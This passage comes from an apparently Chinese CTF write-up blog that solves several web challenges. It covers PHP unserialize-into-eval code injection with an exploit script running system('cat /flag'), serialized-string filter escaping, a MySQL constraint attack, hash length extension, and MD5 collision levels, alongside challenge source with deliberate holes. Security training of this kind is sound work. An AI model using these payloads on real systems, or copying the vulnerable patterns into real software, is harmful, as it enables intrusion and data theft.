preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</td></tr></tbody></table><p>这里有4个地方要绕过 </p><p>第一个if，需要2个get传参，?f4&#x3D;xxxx&amp;ag&#x3D;xxxx，进入else </p><p>第二个if，正则表达式，A-Za-z0-9还有(，这里需要为true，就是说要满足条件，a( b( c(都可以绕过，中括号里面的加上一个括号 </p><p>第三个if，满足条件就行 （w+：字符类(包括大小写字母,数字) ，利用preg_match特性，写2个语句，如:phpinfo();system(ls) </p><p>第四个echo，百度到，也是该对象的个数，绕过方式和wakeup一样 </p><p>构造payload </p><p>f4&#x3D;a( </p><p>闭合eval的话 </p><table><thead><tr><th>$a -&gt; cmd &#x3D; ‘“;phpinfo();$a&#x3D;”3’;</th><th>payload</th></tr></thead><tbody><tr><td>eval(‘$a&#x3D;”‘.$this-&gt;cmd.’”;’);</td><td>需绕过</td></tr><tr><td>eval(‘$a&#x3D;”‘“;phpinfo();”‘“;’);</td><td>拼接上后</td></tr></tbody></table><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//flag在/flag里</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">f4ag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\w+\((?R)?\)/&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$a=&quot;&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;cmd.<span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hack!!!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f4&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ag&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(@<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;getf4ag.php&#x27;</span>,<span class="hljs-literal">true</span>));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[A-Za-z0-9]+\(/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f4&#x27;</span>]))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hack!!!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ag&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">f4ag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\w+\((?R)?\)/&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$a=&quot;&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;cmd.<span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hack!!!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">f4ag</span>();<br><span class="hljs-variable">$a</span> -&gt; cmd = <span class="hljs-string">&#x27;&quot;;phpinfo();system(&quot;cat /flag&quot;);&quot;&#x27;</span>;<br><span class="hljs-comment">#$a -&gt; cmd = &#x27;&quot;;phpinfo();$b=&quot;&#x27;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="11、WEB-serialize-wc"><a href="#11、WEB-serialize-wc" class="headerlink" title="11、WEB_serialize_wc"></a><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212839607.png" alt="image-20241024212839607">11、WEB_serialize_wc</h2><p>git泄露。 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024212906846.png" alt="image-20241024212906846"></p><p>user设置指定值，dir有过滤，在repass传入payload </p><p>题目代码</p><p>index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;file-reading&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;form action=&quot;index.php&quot; method=&quot;GET&quot;&gt;<br>username&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;<br>password&lt;input type=&quot;text&quot; name=&quot;pass&quot;&gt;<br>repassword&lt;input type=&quot;text&quot; name=&quot;repass&quot;&gt;<br>filename&lt;input type=&quot;text&quot; name=&quot;dir&quot;&gt;<br>&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;<br>&lt;/form&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br>only admin can view /flag<br>&lt;?php<br>include &#x27;config.php&#x27;;<br><br><br>$data = unserialize($get);<br>if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;) &#123;<br>$myFile = new File($data[&#x27;user&#x27;], $data[&#x27;pass&#x27;], $data[&#x27;repass&#x27;], $data[&#x27;dir&#x27;]);<br>&#125; else &#123;<br>if (preg_match(&#x27;/flag|\.\.|\/|index|config/i&#x27;, $dir)) &#123;<br>    die(&#x27;NO Hacker !!!!!!!!&#x27;);<br>&#125;<br>$myFile = new File($data[&#x27;user&#x27;], $data[&#x27;pass&#x27;], $data[&#x27;repass&#x27;], $data[&#x27;dir&#x27;]);<br>&#125;<br><br><br>?&gt;<br></code></pre></div></td></tr></table></figure><p>config.php</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>// error_reporting(0);<br>class File &#123;<br><br>    public $user;<br>    public $pass;<br>    public $repass;<br>    public $dir;<br><br>    function __construct($data1, $data2, $data3, $data4)<br>    &#123;<br>        $this-&gt;user = $data1;<br>        $this-&gt;pass = $data2;<br>        $this-&gt;repass = $data3;<br>        $this-&gt;dir = $data4;<br>    &#125;<br><br>    function Login()<br>    &#123;<br>    if (($this-&gt;user == &#x27;ohhhh&#x27; &amp;&amp; $this-&gt;pass == &#x27;a3333&#x27;) || ($this-&gt;user == &#x27;admin&#x27; &amp;&amp; $this-&gt;pass == &#x27;admin888&#x27;)) &#123;<br>    return true;<br>    &#125; else &#123;<br>    return false;<br>    &#125;<br>    &#125;<br><br>    function __destruct()<br>    &#123;<br>    if ($this-&gt;Login()) &#123;<br>    readfile($this-&gt;dir);<br>    &#125; else &#123;<br>    die(&#x27;wrong user or pass&#x27;);<br>    &#125;<br>    &#125;<br>&#125;<br><br>function filter($data)&#123;<br>    if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;) &#123;<br>        return $data;<br>    &#125; else &#123;<br>        $filter_arr = array(&#x27;admin&#x27;,&#x27;test&#x27;,&#x27;root&#x27;);<br>        return preg_replace(&#x27;/admin|test|root/i&#x27;,&#x27;hacker&#x27;,$data);<br>    &#125;<br><br>&#125;<br><br>if (isset($_GET[&#x27;user&#x27;]) &amp;&amp; isset($_GET[&#x27;pass&#x27;]) &amp;&amp; isset($_GET[&#x27;repass&#x27;]) &amp;&amp; isset($_GET[&#x27;dir&#x27;])) &#123;<br>    $user = $_GET[&#x27;user&#x27;];<br>    $pass = $_GET[&#x27;pass&#x27;];<br>    $repass = $_GET[&#x27;repass&#x27;];<br>    $dir = $_GET[&#x27;dir&#x27;];<br><br>    $get = filter(serialize($_GET));<br>&#125; else &#123;<br>    die(&#x27;hello world&#x27;);<br>&#125;<br><br><br><br>?&gt;<br></code></pre></div></td></tr></table></figure><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213101422.png" alt="image-20241024213101422"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213110669.png" alt="image-20241024213110669"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213120035.png" alt="image-20241024213120035"></p><h2 id="12、WEB-login-wc"><a href="#12、WEB-login-wc" class="headerlink" title="12、WEB_login_wc"></a>12、WEB_login_wc</h2><p>这里是mysql的约束攻击，注册admin   账号很多空格，成因是因为后端没引号闭合约束 </p><p><a href="https://blog.csdn.net/bouIevard/article/details/121674348">https://blog.csdn.net/bouIevard/article/details/121674348</a> </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213205514.png" alt="image-20241024213205514"></p><h2 id="13、WEB-just-play-wc"><a href="#13、WEB-just-play-wc" class="headerlink" title="13、WEB_just_play_wc"></a>13、WEB_just_play_wc</h2><p>进去是一个JS的小游戏，查看源码 </p><p>看到一个js，写个脚本爆破一下 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213517791.png" alt="image-20241024213517791"></p><p>脚本跑出来 </p><p><a href="http://192.168.1.200:40150/js/bhctf76.js">http://192.168.1.200:40150/js/bhctf76.js</a> </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213528923.png" alt="image-20241024213528923"></p><p>同时也存在git泄露,但是屁用没有 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213539655.png" alt="image-20241024213539655"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213545465.png" alt="image-20241024213545465"></p><p>看网上相似的题型 </p><p>提示在getflag.php中，这里key是空的，然后guest是固定传进函数加密，这里判断需要为amdin，使用hash长度拓展攻击，使用hashpump，抓包后跟着填就行了，长度是32，这里比较模糊，其他题型也有46位和20位的，后面是类似于溢出的？admin？ </p><p>hash长度扩展攻击 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213617430.png" alt="image-20241024213617430"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213624307.png" alt="image-20241024213624307"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213631759.png" alt="image-20241024213631759"></p><p>这里默认是16进制的，需要将\x变成%，还有一些其他的符号也需要用URL编码，然后在替换cookie中的verify </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213640810.png" alt="image-20241024213640810"></p><p>参考 </p><p><a href="https://blog.csdn.net/weixin_34062329/article/details/94348233">https://blog.csdn.net/weixin_34062329/article/details/94348233</a> ——WEB15 </p><p><a href="https://zhuanlan.zhihu.com/p/106534008">https://zhuanlan.zhihu.com/p/106534008</a> </p><p><a href="https://www.cnblogs.com/pcat/p/5478509.html">https://www.cnblogs.com/pcat/p/5478509.html</a> </p><p><a href="https://blog.csdn.net/weixin_39934520/article/details/108320878">https://blog.csdn.net/weixin_39934520/article/details/108320878</a> </p><h2 id="14、WEB-hashcollection-wc"><a href="#14、WEB-hashcollection-wc" class="headerlink" title="14、WEB_hashcollection_wc"></a>14、WEB_hashcollection_wc</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;hash1&quot;</span>] != <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&quot;md2&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;hash1&quot;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;level 1 failed&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash2&#x27;</span>] === <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash3&#x27;</span>] || <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash2&#x27;</span>]) !== <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash3&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;level 2 failed&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//level 3</span><br><span class="hljs-variable">$hash4</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash4&#x27;</span>];<br><span class="hljs-variable">$hash5</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash5&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$hash4</span>))&#123;<br>    <span class="hljs-variable">$md5_1</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$hash4</span>);<br>    <span class="hljs-variable">$md5_2</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$hash5</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$md5_1</span> != <span class="hljs-variable">$md5_2</span>)&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$md5_1</span>, <span class="hljs-string">&#x27;amtkz&#x27;</span>, <span class="hljs-string">&#x27;0316&#x27;</span>);<br>        <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$md5_2</span>, <span class="hljs-string">&#x27;amtkz&#x27;</span>, <span class="hljs-string">&#x27;0316&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;level 3 success&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;can u give me the right hash?&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;is hash4 numeric??????&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">//level 4</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash6&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash7&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash6&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash7&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))) &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;level 4 success&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wrong!&quot;</span>;<br>    &#125;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;wrong!&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-comment">//level 5</span><br><span class="hljs-variable">$str1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str1&#x27;</span>];<br><span class="hljs-variable">$str2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str2&#x27;</span>];<br><span class="hljs-variable">$str3</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str3&#x27;</span>];<br><span class="hljs-variable">$str4</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str4&#x27;</span>];<br><span class="hljs-variable">$str5</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str5&#x27;</span>];<br><span class="hljs-variable">$str6</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str6&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>) &amp;&amp;<br><br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str2</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>) &amp;&amp;<br><br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str3</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>) &amp;&amp;<br><br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) &amp;&amp;<br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str4</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>) &amp;&amp;<br><br>    <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str5</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str6</span>)<br>) &#123;<br>    <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>&#125;<br>level <span class="hljs-number">1</span> failed<br></code></pre></div></td></tr></table></figure><h2 id="15、WEB-fff2-wc"><a href="#15、WEB-fff2-wc" class="headerlink" title="15、WEB_fff2_wc"></a>15、WEB_fff2_wc</h2><p>先介绍一下stdClass的类——来自 <a href="https://www.jb51.net/article/49140.htm">https://www.jb51.net/article/49140.htm</a> </p><p>$user &#x3D; new stdClass(); </p><p>$user-&gt;name &#x3D; ‘gouki’; </p><p>这样的代码，这是干嘛用的呢？ </p><p>翻开手册，搜索stdClass，你会发现，手册上几乎没有介绍，如果你再次搜索google，看到的也几乎全是英文解释。 </p><p>其实，stdClass在PHP5才开始被流行。而stdClass也是zend的一个保留类。似乎没有其他作用。也几乎没有任何说明。 </p><p>或者，我们可以这么理解：stdClass是PHP的一个基类，所有的类几乎都继承这个类，所以任何时候都可以被new，可以让这个变量成为一个object。同时，这个基类又有一个特殊的地方，就是没有方法。 